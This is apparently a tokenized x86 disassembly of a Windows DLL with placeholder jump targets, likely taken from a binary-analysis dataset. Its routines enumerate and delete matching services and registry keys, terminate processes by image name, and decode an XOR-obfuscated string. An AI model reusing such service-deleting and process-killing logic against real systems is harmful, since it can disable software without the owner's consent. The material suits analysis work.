mov esi [ ebp - 0x64 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x60 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x84 ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x80 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x7c ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x78 ]
mov [ eax + 0xc ] esi
mov eax [ edx + 0x28 ]
push ecx
call eax
mov esi [ VariantClear@IAT ]
lea ecx [ ebp - 0x84 ]
push ecx
mov edi eax
call esi
lea edx [ ebp - 0x94 ]
push edx
call esi
lea eax [ ebp - 0xa4 ]
push eax
call esi
lea ecx [ ebp - 0x4c ]
push ecx
mov [ ebp - 0x4 ] 0xffffffff
call esi
xor ebx ebx
cmp edi ebx
jge r-xdata
call [ CoUninitialize@IAT ]
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x74 ]
push ecx
mov edi r--data
mov [ ebp - 0x14 ] ebx
call sub_1006f670
mov [ ebp - 0x4 ] 0x4
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
call [ CoUninitialize@IAT ]
lea eax [ ebx + 0x3 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x18 ]
push edx
mov [ ebp - 0x18 ] ebx
mov ecx [ eax ]
push ebx
push eax
mov eax [ ecx + 0x38 ]
call eax
test eax eax
jns r-xdata
call [ CoUninitialize@IAT ]
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
lea edi [ ebp - 0x14 ]
push edi
push ecx
push eax
mov eax [ edx + 0x1c ]
call eax
lea edi [ ebp - 0x74 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x4 ] 0xffffffff
call sub_1004d6c0
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp [ ebp - 0x38 ] ebx
jge r-xdata
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
cmp eax ebx
jl r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x5
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x34 ]
cmp ecx ebx
je r-xdata
xor eax eax
cmp ecx ebx
jle r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x7
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx 0x3
mov [ ebp - 0x4c ] cx
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x4 ] 0x5
mov ebx [ ebp - 0x4c ]
mov edx [ ebp - 0x18 ]
mov edi [ edx ]
lea eax [ ebp - 0x2c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x48 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x40 ]
push edx
mov edx [ edi + 0x20 ]
mov [ eax + 0xc ] ecx
call edx
mov edi eax
lea eax [ ebp - 0x4c ]
push eax
mov [ ebp - 0x4 ] 0xffffffff
call esi
xor ebx ebx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x34 ]
jl r-xdata
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x4c ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
mov edi eax
mov eax [ ebp - 0x30 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
lea edx [ ebp - 0x3c ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x3c ]
cmp ecx ebx
je r-xdata
xor eax eax
cmp ecx ebx
jle r-xdata
lea esp [ esp ]
mov eax ebx
xor ebx ebx
cmp eax [ ebp - 0x3c ]
jl r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ eax ]
lea edx [ ebp - 0x70 ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
test eax eax
js r-xdata
mov [ ebp - 0x28 ] ebx
lea ebx [ eax + 0x1 ]
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
lea edx [ ebp - 0x28 ]
push edx
push ebx
push eax
mov eax [ ecx + 0x20 ]
call eax
test eax eax
js r-xdata
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x28 ]
lea edx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] 0x0
mov ecx [ eax ]
push edx
mov edi eax
push eax
mov eax [ ecx + 0x28 ]
call eax
test eax eax
js r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x8 ]
push edi
call ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
push ecx
push edx
call [ StrStrW@IAT ]
test eax eax
jne r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x8 ]
push edi
call ecx
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov ecx [ eax ]
push 0x0
push edx
push eax
mov eax [ ecx + 0x3c ]
call eax
mov eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1002d770
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push edx
call eax
movzx eax ax
mov edx [ ecx + 0x34 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
mov ecx [ ebp + 0x8 ]
mov [ eax ] cx
movzx eax cx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_1002d7c8
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_1006299d
mov [ eax ] 0x9
call sub_10017e58
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_1002d84e
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10069ac6
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10024fe9
int3
sub_1002d880
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x40 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x2c ] cx
cmp [ esi + 0x20 ] 0x8
jb r-xdata
mov eax [ esi + 0x2c ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] ax
je r-xdata
mov edx [ esi + 0xc ]
push edx
call sub_100187af
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_1002d900
push ebp
mov ebp esp
sub esp 0x494
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov [ ebp - 0x48c ] eax
call [ GetProcessHeap@IAT ]
push 0xf003f
push 0x0
push 0x0
mov edi eax
mov [ ebp - 0x484 ] 0x0
call [ OpenSCManagerW@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push esi
mov esi [ EnumServicesStatusExW@IAT ]
push 0x0
push 0x0
lea ecx [ ebp - 0x478 ]
push ecx
lea edx [ ebp - 0x480 ]
push edx
push 0x0
push 0x0
push 0x3
push 0x10
push 0x0
push ebx
call esi
test eax eax
jne r-xdata
pop edi
lea eax [ ebx + 0x1 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x480 ]
push eax
push 0x8
push edi
call [ HeapAlloc@IAT ]
mov [ ebp - 0x470 ] eax
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
je r-xdata
push 0x0
push 0x0
lea ecx [ ebp - 0x478 ]
push ecx
mov ecx [ ebp - 0x480 ]
lea edx [ ebp - 0x494 ]
push edx
push ecx
push eax
push 0x3
push 0x10
push 0x0
push ebx
call esi
test eax eax
jne r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
pop esi
pop edi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push ebx
call [ CloseServiceHandle@IAT ]
pop esi
pop edi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x5c ]
mov eax 0x5
call sub_1000a4b0
lea edx [ ebp - 0x14 ]
mov eax 0x7
call sub_1000a4b0
xor edi edi
cmp [ ebp - 0x478 ] edi
jbe r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
mov edx [ ebp - 0x470 ]
push edx
push 0x0
push edi
call [ HeapFree@IAT ]
pop esi
pop edi
mov eax 0x4
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push ebx
call [ CloseServiceHandle@IAT ]
mov eax [ ebp - 0x484 ]
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
pop esi
and eax 0xfffffffb
pop edi
xor ecx ebp
add eax 0x5
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x470 ]
lea esi [ ebp - 0x5c ]
lea eax [ ebp - 0x264 ]
sub esi eax
mov [ ebp - 0x490 ] esi
mov [ ebp - 0x474 ] ecx
lea esp [ esp ]
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
mov eax [ ebp - 0x474 ]
mov edx [ eax ]
mov eax 0x104
lea ecx [ ebp - 0x264 ]
lea ecx [ ecx ]
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
test eax eax
je r-xdata
add ecx 0x2
dec eax
jne r-xdata
jmp r-xdata
lea ecx [ ebp - 0x47c ]
push ecx
push 0x20119
push 0x0
lea edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov ecx 0x104
sub ecx eax
mov eax 0x104
push edx
sub eax ecx
lea ecx [ ebp + ecx * 2 - 0x264 ]
mov edx 0x7fffffff
call sub_10072800
cmp [ ecx ] 0x0
je r-xdata
jmp r-xdata
add [ ebp - 0x474 ] 0x2c
inc edi
cmp edi [ ebp - 0x478 ]
jb r-xdata
lea eax [ ebp - 0x488 ]
push eax
mov eax [ ebp - 0x47c ]
lea ecx [ ebp - 0x46c ]
push ecx
push 0x0
push 0x0
lea edx [ ebp - 0x14 ]
push edx
push eax
mov [ ebp - 0x488 ] 0x208
call [ RegQueryValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov edx 0x104
lea eax [ ebp - 0x264 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x47c ]
push ecx
call [ RegCloseKey@IAT ]
test esi esi
jne r-xdata
mov esi 0x2
mov esi [ ebp - 0x490 ]
mov edx [ ebp - 0x48c ]
push edx
lea eax [ ebp - 0x46c ]
push eax
call [ StrStrW@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x264 ]
push ecx
push 0x80000002
call [ RegDeleteKeyW@IAT ]
imul edi edi 0x2c
mov edx [ ebp - 0x470 ]
mov eax [ edi + edx ]
push 0xf01ff
push eax
push ebx
call [ OpenServiceW@IAT ]
mov esi eax
push esi
call [ DeleteService@IAT ]
push esi
mov [ ebp - 0x484 ] eax
call [ CloseServiceHandle@IAT ]
sub_1002dc10
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x8 ]
mov [ edx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_1005fbb8
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_1002dc50
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi edx
push edi
mov edi ecx
mov [ ebp - 0x54 ] esi
call sub_10045bd0
test eax eax
je r-xdata
mov esi [ ebx + 0x54 ]
test esi esi
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0xf1
call sub_10053240
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ esi ]
lea eax [ ebp - 0x54 ]
push eax
call sub_10042b70
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_1002dcb0
push ebp
mov ebp esp
sub esp 0x648
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
push 0x0
push 0x2
call [ CreateToolhelp32Snapshot@IAT ]
mov edi eax
mov [ ebp - 0x644 ] edi
cmp edi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x640 ]
push eax
push edi
mov [ ebp - 0x640 ] 0x22c
call [ Process32FirstW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push ebx
push esi
call [ GetCurrentProcessId@IAT ]
mov ebx [ OpenProcess@IAT ]
push eax
push 0x0
push 0x400
mov [ ebp - 0x648 ] eax
call ebx
mov esi eax
test esi esi
jne r-xdata
push edi
call [ CloseHandle@IAT ]
mov eax 0x2
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push 0x104
lea ecx [ ebp - 0x20c ]
push ecx
push esi
call [ GetProcessImageFileNameW@IAT ]
push esi
test eax eax
jne r-xdata
push edi
call [ CloseHandle@IAT ]
lea eax [ esi + 0x3 ]
pop esi
pop ebx
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edi [ CloseHandle@IAT ]
call edi
jmp r-xdata
mov esi [ CloseHandle@IAT ]
call esi
push edi
call esi
pop esi
pop ebx
mov eax 0x4
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x638 ]
cmp eax [ ebp - 0x648 ]
je r-xdata
mov esi [ ebp - 0x644 ]
lea eax [ ebp - 0x640 ]
push eax
push esi
call [ Process32NextW@IAT ]
test eax eax
jne r-xdata
push eax
push 0x0
push 0x400
call ebx
mov esi eax
test esi esi
je r-xdata
push esi
call edi
pop esi
pop ebx
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push 0x104
lea edx [ ebp - 0x414 ]
push edx
push esi
call [ GetProcessImageFileNameW@IAT ]
push esi
test eax eax
je r-xdata
call edi
call edi
lea eax [ ebp - 0x20c ]
push eax
lea ecx [ ebp - 0x414 ]
push ecx
call [ StrCmpW@IAT ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x638 ]
push edx
push eax
push 0x1
call ebx
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x644 ]
push ecx
call edi
pop esi
pop ebx
mov eax 0x5
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push 0x0
push esi
call [ TerminateProcess@IAT ]
push esi
test eax eax
je r-xdata
call edi
mov edx [ ebp - 0x644 ]
push edx
call edi
mov ecx [ ebp - 0x4 ]
pop esi
pop ebx
xor ecx ebp
mov eax 0x6
pop edi
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1002dea0
push ebp
mov ebp esp
push 0xffffffff
push sub_10088d86
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x2c
and edx 0xff
mov [ ebp + eax * 2 - 0x2c ] dx
inc eax
cmp eax 0xb
jb r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
mov ecx [ edi ]
mov eax [ ecx + 0xc ]
lea edx [ ebp - 0x2c ]
push edx
push eax
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov edi [ edi + 0x4 ]
test edi edi
jne r-xdata
mov ecx [ edi ]
push ebx
call sub_10032c60
mov esi eax
test esi esi
jne r-xdata
lea edx [ ebp - 0x74 ]
mov eax 0x14
call sub_10045930
lea eax [ ebp - 0xac ]
push esi
push eax
call sub_1005f2b0
xor edi edi
push eax
lea edx [ ebp - 0x74 ]
lea esi [ ebp - 0x90 ]
mov [ ebp - 0x4 ] edi
call sub_1005bbc0
add esp 0xc
mov edx eax
lea ecx [ edi + 0x17 ]
mov [ ebp - 0x4 ] 0x1
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x7c ] esi
jb r-xdata
xor edx edx
mov [ ebp - 0x7c ] 0x7
mov [ ebp - 0x80 ] edi
mov [ ebp - 0x90 ] dx
cmp [ ebp - 0x98 ] esi
jb r-xdata
mov ecx [ ebp - 0x90 ]
push ecx
call sub_100187af
add esp 0x4
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0xac ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
sub_1002dff0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x38 ]
mov [ ebp - 0x4 ] esi
mov [ esi ] r--data
test ebx ebx
je r-xdata
lea ecx [ esi + 0x4 ]
call sub_1001c957
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edi [ ebx ]
test edi edi
je r-xdata
push ebx
call sub_100187af
add esp 0x4
pop edi
push 0x0
lea ecx [ ebp - 0x8 ]
call sub_10034e98
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x8 ]
not esi
call sub_10069747
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov esi [ ebp - 0x4 ]
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_1002e070
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test edx edx
je r-xdata
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_1000831a
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
cmp ecx 0x10
jb r-xdata
cmp edx eax
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1000831a
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1003f800
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
mov edi [ esi + 0x10 ]
add edi eax
cmp edi edx
jbe r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
push ecx
sub edx eax
push edx
push esi
mov ecx esi
call sub_1005e580
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
push ecx
sub edx eax
push edx
push esi
mov ecx esi
call sub_1005e580
pop edi
pop esi
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
pop ebx
mov [ eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
pop ebx
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
push edx
mov edx [ esi + 0x10 ]
add edx eax
push edx
call sub_1007f5d0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_1002e190
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
push eax
push ecx
push edx
call sub_10052d44
mov esi eax
add esp 0xc
cmp esi 0xffffffff
jne r-xdata
pop esi
pop ebp
retn 0x10
call sub_1006299d
mov eax [ eax ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov eax esi
sub_1002e1d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086590
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0x1fffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x3
cmp eax ecx
jae r-xdata
push r--data
call sub_1000831a
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_10016160
mov ebx eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push eax
mov eax ebx
mov [ ebp - 0x14 ] ebx
call sub_1005ef10
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
add esp 0x4
sar edi 0x3
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea edx [ ebx + ecx * 8 ]
lea eax [ ebx + edi * 8 ]
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
mov [ esi ] ebx
push eax
call sub_100187af
add esp 0x4
sub_1002e2a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
mov ecx esi
sub ecx eax
push ecx
push eax
push edx
call sub_1007f5d0
add esp 0xc
mov eax esi
pop esi
pop ebp
retn 0xc
sub_1002e2c3
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jne r-xdata
movsx edx [ ecx ]
rol eax 0x8
add eax edx
inc ecx
pop ebp
retn 0x8
sub_1002e2e1
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
push 0x0
push edi
call sub_1001eb83
test al al
je r-xdata
push r--data
call sub_1000831a
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
mov ecx esi
push edi
push 0x0
call sub_10033309
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_1002e340
push ebp
mov ebp esp
push 0xffffffff
push sub_10086798
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx ecx
xor edi edi
push 0x4
mov [ ebx ] edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0xc ] edi
mov [ ebx + 0x10 ] edi
mov [ ebx + 0x14 ] edi
push edi
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x50 ] eax
mov [ ebx + 0x18 ] edi
mov [ ebx + 0x1c ] edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ ebx + 0x1c ] eax
inc [ eax ]
lea esi [ ebx + 0x20 ]
push 0x4
mov [ ebp - 0x4 ] edi
push edi
mov [ ebp - 0x7c ] esi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x4 ] eax
inc [ eax ]
mov esi [ GetProcessHeap@IAT ]
